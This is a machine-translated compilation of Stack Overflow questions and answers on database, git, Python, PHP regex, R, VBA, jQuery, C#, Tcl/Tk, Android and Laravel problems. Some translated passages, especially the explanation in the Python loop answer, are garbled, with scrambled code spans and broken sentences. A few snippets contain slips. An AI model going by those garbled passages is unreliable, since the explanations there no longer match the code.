with open("C:/Abaqus_JOBS/brace.txt", 'w') as fbrace:
    for row in n_brace:
        print >>fbrace, ', '.join(map(str, row)) 
```

# database - 可以在heroku postgresql中删除一行吗？

> ID：15526776
> 
> 赞同：5
> 
> 时间：2013-03-20T14:45:16.490
> 
> 标签：database, postgresql, heroku, django-models, django-forms

我在这里有一个小问题，我有一个 django 应用程序，不知何故，在生产数据库中，在一个不存在的表中创建了一行，与确实存在的其他行同名，好吧，这听起来很奇怪，但我的问题非常简单：

我在 heroku 中有一个无法删除的数据库，我想删除一个表的单行，甚至是那个表（只有那个表），但我不知道该怎么做。

我该怎么做？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T15:47:05.980

您可以使用 heroku cli`heroku pg:psql`直接连接到您的 PG 实例，然后发出您想要的 SQL 命令。或者，使用连接到数据库的 GUI（来自 DATABASE_URL 配置键的信息`heroku config`）并从那里进行操作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2020-09-26T03:55:34.573

我在这里有点晚了，但这可能会帮助那些偶然发现这个线程的人......

如果您转到 Heroku 应用程序的仪表板（通过网站）> 设置 > “显示配置变量”> DATABASE_URL，然后将该 URL 粘贴到浏览器中。

我使用 TablePlus 进行数据库管理，当我将链接粘贴到浏览器中时，它会询问它是否可以打开 TablePlus，然后我可以像在开发中那样实时编辑我的生产数据库。

如果您没有 TablePlus，我不确定将 URL 粘贴到浏览器中会做什么。我想它会请求打开您可能拥有的任何其他 SQL 管理应用程序。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-10-27T19:41:34.150

使用连接到 Heroku 数据库

```
heroku console 
```

然后键入如下命令，根据需要修改表名和列名（或发布您希望查找要删除的记录的列名和条件）。

```
User.find(1).destroy 
```

# git - 删除我的 git 目录是否安全？克隆到错误的位置

> ID：15526777
> 
> 赞同：5
> 
> 时间：2013-03-20T14:45:17.697
> 
> 标签：git

noob alert：我正在学习版本控制，并在一家使用 git 的公司开始工作。我做了 git clone 将公司代码库拉到我的机器上，但我把它拉到了错误的目录中。我可以通过发出 a`rm -rf *`或类似这些行的东西来删除我机器上的这个目录，然后将克隆重做到首选目录吗？

我只是想确保这样做是安全的，我不想破坏公司的代码库。

先感谢您。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-20T14:46:16.527

是的，你可以这么做。它只会删除您的本地副本。

话虽如此，更简单的方法可能是将其简单地移动到首选位置。

每个 git 存储库都是自包含的，并不关心它被克隆到哪里。

# python-2.7 - 循环中的条件优先级并以两种可能条件之一结束循环

> ID：15526780
> 
> 赞同：1
> 
> 时间：2013-03-20T14:45:28.963
> 
> 标签：python-2.7, while-loop, conditional-statements

这个问题有两个问题：

1.  是否有一组特定的条件优先规则与 while 循环中的条件相关？
2.  我怎样才能获得两个满足条件之一（即condition_x OR condition_y）来完成一个循环？

**细节：**

作为一个 python 新手，我在 while 循环中遇到了一种情况，其中某些条件优先于其他条件。

我正在尝试制作：

1.  所需的两个值之一，即“y”或“n”
2.  但是，如果选择“n”，则返回一个自定义提示，然后允许值“ok”
3.  并使其在步骤 1 中输入 'y' 或在步骤 3 中输入 'ok' 将完成循环

发生的情况是，当输入“n”时，第一个条件优先并返回语句：

```
please enter 'y' or 'n' 
```

当我希望它返回时：

```
oh come on, enter 'ok' 
```

**代码：**

（我知道使用两个`break`'s 可能是错误的 - 我不知道如何让 'y' 或 'ok' 完成循环）

```
while True:
    user_input = raw_input('question? (y/n)')
    my_string = 'here is a string '
    if len(user_input) == 0:
        print 'question? (y/n)'
    elif user_input is not 'y' or 'n':
        print 'please enter \'y\' or \'n\''
    elif user_input is 'n':
        print 'oh come on, enter \'ok\''
    elif user_input is 'ok':
        print my_string + ', ' \
        .join(list_var[:-1]), list_var[-1] + '?'
        break
    else:
        print my_string + ', ' \
        .join(list_var[:-1]), list_var[-1] + '?'
        break 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:46:45.960

您正在构建错误的布尔逻辑；利用：

```
elif user_input not in ('y', 'n'): 
```

反而。

该表达式`user_input is not 'y' or 'n'`被解释为`(user_input is not 'y') or ('n')`，它*始终*`True`为 True （在布尔上下文中考虑非空字符串）：

```
>>> if 'n': print 'n!'
...
n! 
```

您还应该使用`==`相等测试而不是`is`身份测试。`is`测试两个操作数是否*是同一个对象*，而`==`测试两个操作数是否具有相同的值。对于有时碰巧同时为 True 的小字符串，但这是 Python 优化，而不是您可以依赖的东西来处理所有字符串。

下一个问题是，当用户输入是您过度使用`elif`. 例如，当`user_input`是，*不是*或，所以匹配，*排除所有其他**分支*。`ok` *`y``n``elif user_input not in ('y', 'n')`*`elif`**

 *你真的想简化你的逻辑：

```
if user_input not in ('y', 'n', 'ok'):
    print "please enter 'y' or 'n'"
elif user_input == 'n':
    print "oh come on, enter 'ok'"
else:
    print '{}{}{}?'.format(my_string, ', '.join(list_var[:-1]), list_var[-1])
    break 
```

`while`这些都与循环无关。*

# php - 正则表达式负前瞻/后视从查找和替换中排除 HTML

> ID：15526781
> 
> 赞同：0
> 
> 时间：2013-03-20T14:45:31.907
> 
> 标签：php, html, regex, html-parsing, preg-replace

我的网站上有一项功能，搜索结果中突出显示了搜索查询。但是，该站点搜索的某些字段中包含 HTML。例如，假设我的搜索结果由`<span>Hello all</span>`. 如果用户搜索 letter `a`，我希望代码返回而不是现在返回`<span>Hello <mark>a</mark>all</span>`的混乱。`<sp<mark>a</mark>n>Hello <mark>a</mark>ll</sp<mark>a</mark>n>`

我知道我可以使用否定的lookbehinds 和lookaheads in`preg_replace()`来排除`a`a`<`和`>`. 但是我该怎么做呢？正则表达式是我的弱点之一，我似乎无法提出任何工作。

到目前为止，我得到的是：

```
$return = preg_replace("/(?<!\<[a-z\s]+?)$match(?!\>[a-z\s]+?)/i", '<mark>'.$match.'</mark>', $result); 
```

但这似乎不起作用。有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:10:50.413

如果您确实想使用正则表达式，则只需要一个简单的否定前瞻（假设格式良好的标记没有标签`<`或`>`标签之内或之间）

```
$return = preg_replace("/$match(?![^<>]*>)/i", '<mark>$0</mark>', $result); 
```

任何特殊的正则表达式字符`$match`都需要正确转义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T16:27:18.920

使用正则表达式解析 HTML 等复杂语言被认为是不好的做法。有足够的技能和耐心，以及先进的正则表达式引擎，这可能是可能的，但潜在的陷阱是巨大的，性能不太可能很好。

更好的解决方案是使用 dom 解析器，例如 PHP 的内置`DOMDocument`类。

[在这个相关的 SO question 的答案中可以找到](https://stackoverflow.com/questions/9335689/dom-parser-to-highlight-keywords-not-working)一个很好的例子。

希望有帮助。

# r - 从 R 中的指示变量中获取值

> ID：15526782
> 
> 赞同：1
> 
> 时间：2013-03-20T14:45:34.037
> 
> 标签：r, statistics

首先，我必须对 20m X 30m 矩形中的两个点的坐标进行建模。显然，这些点遵循均匀分布，所以这是我的代码的第一部分：

```
 X1 <- runif(1,0,20)
    X2 <- runif(1,0,30)
    point1 <- c(X1,X2)
    point1 
```

我对第二个点（'point2'）使用了相同的代码，但分别用 Y1 和 Y2 替换了 X1 和 X2。

然后我必须找到两点之间的距离：

```
 distance <- sqrt(((X1-Y1)^2)+((X2-Y2)^2)) 
```

现在如果我将 A 定义为点在 5m 到 10m 范围内的事件，我需要找到这个事件的指标变量。这就是我要做的，但我不确定它是否正确：

```
 x=0
    if (distance < 10 & distance > 5)
    {
     x=1
    }
    Z <- c(distance,x) 
```

如果我要重复这些命令 1000 次，我将如何存储每个模拟中的值并在 1000 次重复中找到最小和最大分离值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:52:27.727

关。使用`ifelse`或简单地使用矢量化形式来定义您的事件。对于 1000 个样本，您只需使用`runif`生成 1000 个样本。也没有必要`c(X1 , X2)`，您可以在距离计算中将它们称为向量...

```
#Just make 1000 calls to runif 
X1 <- runif(1000,0,20)
X2 <- runif(1000,0,30)
Y1 <- runif(1000,0,20)
Y2 <- runif(1000,0,30)
distance <- sqrt(((X1-Y1)^2)+((X2-Y2)^2))

head(distance)
#[1]  9.050522 19.512849 10.413407  7.736564  2.742174 13.729397

# gives 1 if points are within 5 to 10m of each other
event <- ifelse ( distance >= 5 & distance <= 10 , 1 , 0 )

#Or even better, from @GavinSimpson's comment just use a vectorised form (we use as.nuemric to turn TRUE / FALSE into 1 and 0, but you could leave that out if you wish)
event <- as.numeric( distance >= 5 & distance <= 10 )

head( event )
#[1] 1 0 0 1 0 0

# And the minimum and maximum sepration distance of those events
min(distance[distance >= 5 & distance <= 10])
#[1] 5.017296
max(distance[distance >= 5 & distance <= 10])
#[1] 9.989868 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:52:55.700

在某一时刻，您使用 X1 和 X2，然后引用尚未定义的 Y1。我很确定你想使用：

```
 points <- cbind(X1, X2) 
```

上下文表明您希望将 X1 和 X2 值保持在“平行”排列中，并定义一个矩阵而不是一个无尺寸的对象来实现这一点。

使用 R 的矩阵运算回答的最后一个问题：

```
points1 <- matrix( runif(2000), ncol=2)
points1 <- matrix( runif(2000), ncol=2)
dists <- rowSums( (points1-points2)^2 )
Z <- dists <10 & dists >5 
```

# excel - 为什么我在 VBA 匹配中收到错误 2042？

> ID：15526784
> 
> 赞同：15
> 
> 时间：2013-03-20T14:45:38.500
> 
> 标签：excel, excel-2007, vba

我有A列：

```
+--+--------+
|  |  A     |
+--+--------+
| 1|123456  |
|--+--------+
| 2|Order_No|
|--+--------+
| 3|    7   |
+--+--------+ 
```

现在如果我输入：

```
=Match(7,A1:A5,0) 
```

进入我得到的工作表上的一个单元格

```
3 
```

因此。（这是想要的）

但是当我输入这一行时：

```
Dim CurrentShipment As Integer
CurrentShipment = 7
CurrentRow = Application.Match(CurrentShipment, Range("A1:A5"), 0) 
```

CurrentRow 的值为“错误 2042”

我的第一直觉是确保值 7 实际上在范围内，并且确实如此。

我的下一个可能是 Match 函数需要一个字符串，所以我尝试了

```
Dim CurrentShipment As Integer
CurrentShipment = 7
CurrentRow = Application.Match(Cstr(CurrentShipment), Range("A1:A5"), 0) 
```

无济于事。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-09-19T13:48:10.020

作为对此的附带说明，对于将来遇到此错误的任何人，任何函数都返回可能的错误，变体类型工作得很好：

```
Dim vreturn as variant 

vreturn = Application.Match(CurrentShipment, Range("A1:A5"), 0) ' this could be any function like a vlookup for example as well

If IsError(vreturn) Then
    ' handle error
Else
    CurrentRow = cint(vreturn)
End If 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-03-20T14:50:30.127

请参阅 VBA[单元错误值](https://docs.microsoft.com/en-us/office/vba/excel/Concepts/Cells-and-Ranges/cell-error-values)列表：

> ```
> Constant    Error number  Cell error value
> xlErrDiv0   2007          #DIV/0!
> xlErrNA     2042          #N/A
> xlErrName   2029          #NAME?
> xlErrNull   2000          #NULL!
> xlErrNum    2036          #NUM!
> xlErrRef    2023          #REF!
> xlErrValue  2015          #VALUE! 
> ```

尝试将值`CurrentShipment`从a 转换`Integer`为 a`Long`而不是 a `String`：

```
CurrentRow = Application.Match(CLng(CurrentShipment), Range("A1:A5"), 0) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T15:18:45.280

如果您在对象浏览器中查找 match 函数，它会返回 double 所以我已将变量 CurrentRow 声明为 double 并且它接受 3 个变体参数。如果它适合您，请尝试以下代码。

![在此处输入图像描述](../Images/e850f2305b0a40aeb6612d40476b780a.png)

![在此处输入图像描述](../Images/854f4a4cf7bf02386df78d1f23ed197c.png)

```
 Sub sample()

    Dim CurrentShipment As Variant
    CurrentShipment = 7

    Dim CurrentRow As Double
    CurrentRow = Application.Match(CurrentShipment, Range("A1:A5"), 0)
    End Sub 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T15:07:16.300

有趣的是，我将您的数据输入到一张空白的 Excel 表格中，然后运行您的原始代码片段。正如预期的那样，它返回 3，而无需将 CurrentShipment 转换为 String 或 Long。

默认情况下，不 DIM'ing CurrentRow 使其成为 Variant，但即使将它们都设置为 Integer 或 CurrentRow 作为 Byte 也不会引发错误，因此使用 Double 作为返回类型是多余的。

```
Sub Match()

Dim CurrentShipment As Integer
Dim CurrentRow As Byte '<--- NOTE

CurrentShipment = 7
CurrentRow = Application.Match(CurrentShipment, Range("A1:A5"), 0)

MsgBox CurrentRow

End Sub 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T15:09:56.063

对我来说，它工作得很好，没有任何类型的转换。我两个都用过：

`Application.WorksheetFunction.Match(CurrentShipment, Range("A1:A5"), 0)`

和

`Application.Match(CurrentShipment, Range("A1:A5"), 0)`

将 CurrentShipment 标注为 Integer、Double、Long 或 Variant，一切正常……

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-03-01T08:48:12.937

尝试在具有多个工作表的工作簿中使用 Match 函数时，我收到了完全相同的错误消息。如果我们尝试匹配的主题不存在，则对接收结果的变量使用变体类型可以很好地避免运行错误。但我的错误在于使用范围的位置。指向具有要搜索范围的工作表至关重要。首先，我在没有工作表引用的情况下使用 Range(...) ，并且只有在激活该工作表时该功能才能正常工作。

# jquery - jQuery Cycle2 同步多个幻灯片以一个接一个地运行

> ID：15526789
> 
> 赞同：1
> 
> 时间：2013-03-20T14:46:01.580
> 
> 标签：jquery, jquery-cycle2

我在一个页面上有 6 个 jQuery 循环，我希望第一个循环改变然后暂停，然后我希望第二个循环在几秒钟后改变并暂停，依此类推，直到最后一个循环然后它又回到开头.

我看到有人发布了一些东西，但它不适用于我的代码：

```
$('.cycle').each(function(){
   $(this).cycle({
      delay:   -8000 + (2000 * (i+1)),
      timeout:  8000
   });
}); 
```

我的代码是：

```
<div class="cycle">
   <img alt="" src="_assets/images/one.png">
   <img alt="" src="_assets/images/two.png">
   <img alt="" src="_assets/images/three.png">
</div>
<div class="cycle">
   <img alt="" src="_assets/images/two.png">
   <img alt="" src="_assets/images/three.png">
   <img alt="" src="_assets/images/one.png">
</div>
<div class="cycle">
   <img alt="" src="_assets/images/three.png">
   <img alt="" src="_assets/images/one.png">
   <img alt="" src="_assets/images/two.png">
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-01T05:36:14.890

查看 api 文档的事件部分：

[http://jquery.malsup.com/cycle2/api/](http://jquery.malsup.com/cycle2/api/)

看起来`cycle-finished`触发器就是您正在寻找的东西。

在 each 中，尝试添加事件：

```
$(this).cycle({
  delay:   -8000 + (2000 * (i+1)),
  timeout:  8000
}).on( 'cycle-finished', function( event, opts ) {
   ....
}); 
```

# android - ICS 和 Jelly Bean 的互联网访问

> ID：15526790
> 
> 赞同：0
> 
> 时间：2013-03-20T14:46:05.120
> 
> 标签：android, permissions, android-4.0-ice-cream-sandwich

我一直想知道如何在 ICS 和 Jelly Bean 上构建应用程序。每当它尝试连接到数据库时，它总是强制关闭。我已经在 ginggerbead 上进行了测试，没有出现任何问题。

我在清单上使用此权限：

```
<uses-permission android:name="android.permission.INTERNET" /> 
```

# jquery - jQuery，Div 在使用 .slideUp( ) 时表现异常；

> ID：15526795
> 
> 赞同：0
> 
> 时间：2013-03-20T14:46:18.337
> 
> 标签：jquery, html

我正在尝试滑动一个大 div 直到它被隐藏，但是在幻灯片动画的最后，div 的顶部开始向下滑动一秒钟。我如何强制 div 只移动 div 的底部并让顶部保持锁定？这是我的代码：

JavaScript

```
$(document).ready(function() {

$(".showBtn").hide();
$(".header").hide();

$(".hideBtn").click(function() {
    $(".hero").slideUp("slow", function() {
        $(".showBtn").show()
        $(".header").show();
    });
});

$(".showBtn").click(function () {
    $(".hero").slideDown();
    $(".showBtn").hide();
    $(".header").hide();
});

}); 
```

html

```
 <div class="hero">
        <h1 class="depth" title="Frederik">Frederik</h1>
        <h2>HTML, CSS, Javascript, C#</h2>
        <div class="hideBtn">
            hide
        </div>
    </div>
    <div class="header">

    </div>
    <div class="showBtn">
        show
    </div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:50:45.933

这可能是由于 h1 上的上边距溢出其父级引起的。删除边距，用填充替换它或添加`overflow: hidden;`到 .hero div。

[http://jsfiddle.net/C7RVB/](http://jsfiddle.net/C7RVB/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:54:41.933

您遇到的问题是由标题标签引起的。默认情况下，所有浏览器都有页眉边距。您需要做的就是将 margin:0 添加到顶部的标题标签以解决该问题。我附上了下面固定代码示例的链接。

```
<h1 class="depth" style="margin:0;" title="Foo Bar">Foo Bar</h1> 
```

[http://jsfiddle.net/9XHtT/](http://jsfiddle.net/9XHtT/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:52:07.387

我不知道是什么原因造成的，但是放置与我的背景颜色相同的边框总是对我有用。我会把它放在英雄班上。希望它可能对你:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:59:33.430

您也可以尝试通过绝对/浮动定位您的 div，es：

```
.hero {
  position: absolute;
} 
```

# c# - SqlBulkCopy 性能

> ID：15526797
> 
> 赞同：8
> 
> 时间：2013-03-20T14:46:21.970
> 
> 标签：c#, sql-server, sqlbulkcopy

我正在努力提高散装货物的性能；每天有 100 条数百万条记录。

我将其移至使用`IDatareader`界面代替数据表，并且确实获得了显着的性能提升（每分钟增加 500,000 条记录）。当前设置是：

*   用于解析分隔文件的自定义缓存读取器。
*   将流阅读器包装在缓冲流中。
*   `IDatareader`枚举对象并实现接口的自定义对象读取器类。
*   然后`SqlBulkCopy`写入服务器

性能瓶颈的大部分直接在`SqlBulkCopy.WriteToServer`. 如果我对流程进行单元测试，但仅排除`WriteToServer`流程在大约 1 分钟内返回。`WriteToServer`需要额外的 15 分钟 +。对于单元测试，它位于我的本地计算机上，因此数据库位于同一驱动器上，因此不必通过网络复制数据。

我正在使用堆表（无索引；集群或非集群；我玩过各种批量大小，但性能没有重大差异）。

有必要减少加载时间，所以我希望现在有人可以从这个出现中挤出更多的血液。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:13:18.563

为什么不直接使用 SSIS？

无论如何，如果您从解析到 IDataReader 进行了处理，那么您已经走上了正确的道路。要优化 SqlBulkCopy 本身，您需要将注意力转向 SQL Server。关键是最少记录的操作。您必须阅读这些 MSDN 文章：

*   [批量导入中最小日志记录的先决条件](http://msdn.microsoft.com/en-us/library/ms190422%28v=sql.105%29.aspx)。
*   [优化批量导入性能](http://msdn.microsoft.com/en-us/library/ms190421%28v=sql.105%29.aspx)。

如果您的目标是 B 树（即聚集索引表），那么遗憾的是，无法声明高性能批量插入的最重要原则之一，即排序输入行集。就这么简单，ADO.Net SqlClient 没有[`SSPROP_FASTLOADOPTIONS -> ORDER(Column)`](http://msdn.microsoft.com/en-us/library/ms130809.aspx)(OleDb) 的等价物。由于引擎不知道数据已经排序，它会在计划中添加一个排序运算符，除了溢出时，它还不错。为避免溢出，请使用小批量（~10k）。请参阅我的原始观点：所有这些都只是[在 SSIS 中设置的选项和单击，](http://msdn.microsoft.com/en-us/library/ms141237.aspx)而不是通过 OleDB MSDN 规范进行挖掘......

如果您的数据流开始时未排序或目标是堆，那么我上面的观点是无声的。

但是，实现最低限度的日志记录仍然是获得良好性能的必要条件。

# c# - 如何通过 OpenXML 在当前活动的 Word 文档中设置自定义属性

> ID：15526800
> 
> 赞同：3
> 
> 时间：2013-03-20T14:46:35.300
> 
> 标签：c#, vsto, openxml, office-interop

到目前为止，我已经能够通过使用 VSTO 并将包流添加到活动文档中来为 Word 文档设置自定义属性，如下所示

```
public static void SetCustomProperty(Microsoft.Office.Interop.Word.Document doc, string propertyName, object propertyValue)
{
    using (MemoryStream stream = new MemoryStream())
    using ((WordprocessingDocument wordDoc = WordprocessingDocument.Create(stream,  WordprocessingDocumentType.Document, true))
    {
        SetProperty(wordDoc, propertyName, propertyValue);
        // Flush the contents of the package.
        wordDoc.Package.Flush();
        // Convert back to flat OPC by using this in-memory package.
        XDocument xDoc = OpcHelper.OpcToFlatOpc(wordDoc.Package);
        // Return the xml string.
        string openxml = xDoc.ToString();
        // Add to Word doc
        doc.CustomXMLParts.Add(openxml);
    }
} 
```

该`SetProperty`方法按照此处的说明工作，[OpcHelper](http://msdn.microsoft.com/en-us/library/office/ff936167%28v=office.14%29.aspx)可以在[此处找到并在](http://code.msdn.microsoft.com/office/Improve-Automation-415bff13)[此处](http://msdn.microsoft.com/en-us/library/ff191178.aspx)进行说明。

问题是我的自定义属性被插入到一个 xml 文件（例如 item1.xml）中，该文件位于OpenXML 文件格式的文件夹*document.zip\customXml中。*稍后当我想阅读我的自定义属性时，我使用的`WordProcessingDocument.CustomFilePropertiesPart`是空的。事实上，我发现`CustomFilePropertiesPart`引用了*document.zip\docProps\custom.xml*文件。

因此，`doc.CustomXMLParts.Add(openxml);`我应该使用什么来填充正确的 xml 文件，即*document.zip\docProps\custom.xml* ，而不是使用什么？

**编辑** 我已经尝试过 Mishra 提出的解决方案但没有成功，即并不总是保存自定义属性。但是，自从他发布了这个解决方案后，我再次尝试，在[这里](http://support.microsoft.com/kb/195425/en-us?fr=1)我发现您首先需要将文档标记为未保存：

```
doc.CustomDocumentProperties.Add("MyProp", False, MsoDocProperties.msoPropertyTypeNumber, 123);
doc.Saved = false;
doc.Save(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T06:50:50.860

您不能使用 CustomXMLParts 集合设置自定义属性。如果您的文档打开更好，请保持简单并使用 CustomDocumentProperties 集合，它非常快速和容易。只有当要插入的数据变化很大时，我才会在 open doc 中使用 open XML。

# tcl - 框架内的标签不会对齐

> ID：15526802
> 
> 赞同：2
> 
> 时间：2013-03-20T14:46:38.600
> 
> 标签：tcl, tk

所以我正在使用 TCL/TK 制作一个界面，但我遇到了一个奇怪的问题，如下图所示。左侧的两个框架（红色）以相同的方式制作。标签应该贴在 e 和 w 上，但正如您所见，第一个下的框架并没有以相同的方式排列标签。

我创建这样的框架

```
labelframe .bswSelfTestFrame -text "BSW Self Test Summary"
labelframe .bswStatusFrame -text "BSW General Status" 
```

我这样包装框架

```
pack .bswStatusFrame -in .hkframe -padx 3 -pady 3 -anchor n -expand yes -fill both
pack .bswSelfTestFrame -in .hkframe -padx 3 -pady 3 -expand yes -fill both
pack .hkframe -side left -expand no 
```

和标签

```
grid .bswStatusFrame.lBSWCurrentMode -in .bswStatusFrame -padx 5 -pady 2 -row 1 -column 1 -sticky w
grid .bswStatusFrame.vBSWCurrentMode -in .bswStatusFrame -padx 10 -pady 2 -row 1 -column 2 -sticky e

grid .bswSelfTestFrame.lLEONRAMtestErr -in .bswSelfTestFrame -padx 5 -pady 2 -row 1 -column 1 -sticky w
grid .bswSelfTestFrame.vLEONRAMtestErr -in .bswSelfTestFrame -padx 10 -pady 2 -row 1 -column 2 -sticky e 
```

![我的图形用户界面](../Images/e6d635934312e37a0e495c6a94b8ce00.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:48:52.457

问题是`grid`几何管理器不知道如何处理下部小部件中的额外空间，因此它将*所有*单元格居中。（左右都有间隙，但顶部和底部都没有，因为整个窗口受到限制。）这通常不是真正想要的，但它确实鼓励你清楚你想要实际得到什么。

最好的解决方法是指定一列来接收额外的空间。此列可以是左侧或右侧，甚至可以是完全没有小部件的列。必须处理空间的列应配置为具有非零权重。您还可以给两列非零权重，当它们将根据其权重共享额外空间时。

```
# The simplest fix...
grid columnconfigure .bswSelfTestFrame 1 -weight 1
# Repeat for all master widgets where you want to fix things 
```

```
# The blank-column version...
grid columnconfigure .bswSelfTestFrame 2 -weight 1
# Note that *I HAVE CHANGED THE COLUMN OF ONE LABEL* below
grid .bswSelfTestFrame.lLEONRAMtestErr -in .bswSelfTestFrame -padx 5 -pady 2 -row 1 -column 1 -sticky w
grid .bswSelfTestFrame.vLEONRAMtestErr -in .bswSelfTestFrame -padx 10 -pady 2 -row 1 -column 3 -sticky e 
```

```
# The two-weighted-column version, both with the same weight...
grid columnconfigure .bswSelfTestFrame 1 -weight 1
grid columnconfigure .bswSelfTestFrame 2 -weight 1

# Alternatively, with new enough version of Tk...
grid columnconfigure .bswSelfTestFrame {1 2} -weight 1 
```

试试看！找出最适合您的方法并使用它。

# android - AndroidManifest.xml 中的两个主要活动

> ID：15526805
> 
> 赞同：15
> 
> 时间：2013-03-20T14:46:50.553
> 
> 标签：android, android-manifest

我想在我的应用程序中有两个主要活动。所以在我的清单中我放了：

```
<activity
    android:name="mypackage1.MainActivity"
    android:label="@string/title_activity_main">

    <intent-filter>
        <action android:name="android.intent.action.MAIN" />

        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>

<activity
    android:name="mypackage2.MainActivity2"
    android:label="@string/title_activity_main2">

    <intent-filter>
        <action android:name="android.intent.action.MAIN" />

        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>

</activity> 
```

在我的应用程序菜单中创建了两个图标。但是当我点击它们中的每一个时，第一个活动 MainActivity 总是会启动。有可能有两个主要活动吗？如果是这样，我所做的有什么问题？谢谢

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-20T14:48:24.157

`LAUNCHER`意图过滤器决定了应用程序抽屉/启动器中显示的内容。这就是为什么您会显示两个图标的原因。

但是，您还设置了意图过滤器，它为整个包`DEFAULT`设置了默认值。`Activity`由于您设置了两次，因此您会遇到第一个/最新注册的优先级问题。删除`DEFAULT`过滤器后，您将能够启动在启动器中单击的任何内容。

简而言之，从两个活动中删除以下行：

```
<category android:name="android.intent.category.DEFAULT" /> 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-03-20T14:48:53.750

是的，只需将您的两个或多个`<activity>`s 标记为`LAUNCHER`清单中。 **此外，您必须`android:taskAffinity`**在两个 Launcher-Activity 上设置属性，指定确切的包和要启动的 Activity。

```
<activity android:label="MyApp" android:name=".MyApp" android:taskAffinity="com.example.MainActivity">
        <intent-filter>
            <action android:name=".MyApp"/>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
</activity>

<activity android:label="Settings" android:name=".Settings" android:taskAffinity="com.example.SettingsActivity" >
    <intent-filter>
        <action android:name=".Settings"/>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-08-21T10:56:01.037

使用`android:documentLaunchMode="intoExisting"`, 根据意图的组件名称和数据 URI 启动单独的任务。如果没有这个（默认情况下），活动将共享所有相同的活动，`android:documentLaunchMode`默认为`none`.

> intoExisting: The system searches for a task whose base intent's **ComponentName and data URI** match those of the launching intent. If the system finds such a task, the system clears the task, and restarts with the root activity receiving a call to onNewIntent(android.content.Intent). If the system does not find such a task, the system creates a new task. [source](https://developer.android.com/guide/topics/manifest/activity-element)

```
 <activity
        android:name=".CameraActivity"
        android:exported="true"
        android:documentLaunchMode="intoExisting"
        android:label="@string/app_1_label">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

    <activity
        android:name=".ProfilePoseNetActivity"
        android:exported="true"
        android:documentLaunchMode="intoExisting"
        android:label="@string/app_2_label">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity> 
```

* * *

The intention of **potroae** using task affinities to prevent your 2 activities from sharing the same task. However, it is annoying to have to select a task name, i.e. `com.example/SettingsActivity` for every task you want to launch separately.

# javascript - JQuery Mobile showPageLoadingMsg 未按预期显示

> ID：15526808
> 
> 赞同：1
> 
> 时间：2013-03-20T14:46:54.110
> 
> 标签：javascript, jquery, jquery-mobile

JQM 的新手，试图找出为什么在页面加载消息出现之前触发警报。我确定我在这里对 JQM 有一个根本的误解，但我无法弄清楚这一点。

```
function onDeviceReady() {

   $mobile.showPageLoadingMsg("b", "Loading...", true);

   for (i=0;i<10000000;i++){
        // simulating work to be done
   }

   alert("hello");

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T01:39:52.453

可能有两件事。

1.  在当前版本的 JQM 中，该方法不再是显示加载消息的方式。现在是 $.mobile.loading('show') 和 $.mobile.loading('hide')

2.  如果您使用的旧版本的 JQM 仍然支持您使用的方法，那么您的代码中会出现轻微错误。它应该是 $.mobile.showPageLoadingMsg("b", "Loading...", true); 你错过了一个 . 美元和手机之间。

# php - 为验证器定义数据库和表名

> ID：15526810
> 
> 赞同：1
> 
> 时间：2013-03-20T14:46:55.210
> 
> 标签：php, database, laravel, validation

通常这是我们用来验证用户输入的方法

```
$rules = array(
        'username'  => 'required|between:3,32|alpha_dash',
        'email' => 'required|email|unique:users',
        'password'  => 'required|min:6',
    ); 
```

但我在这里面临一个问题。我正在为用户使用另一个数据库，而我想通过这部分代码验证用户名和电子邮件应该是唯一的。我可以知道我该怎么做才能做到这一点

```
unique:users 
```

知道要挖掘和验证哪个数据库和表？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:10:26.503

听起来您需要定义自己的验证规则才能实现这一点。您可能需要注册一个规则来验证不同数据库中的唯一性。[此页面](http://laravel.com/docs/validation#custom-validation-rules)包含有关注册您自己的验证规则的文档。您可以调用该`Validator::register`方法或扩展 Validator 类。

在您的规则中，您只需查询数据库以查找包含该电子邮件的行。如果它为 null，则验证通过，否则失败。

# postgresql - 删除大部分大表后重新启动现有行的主键号

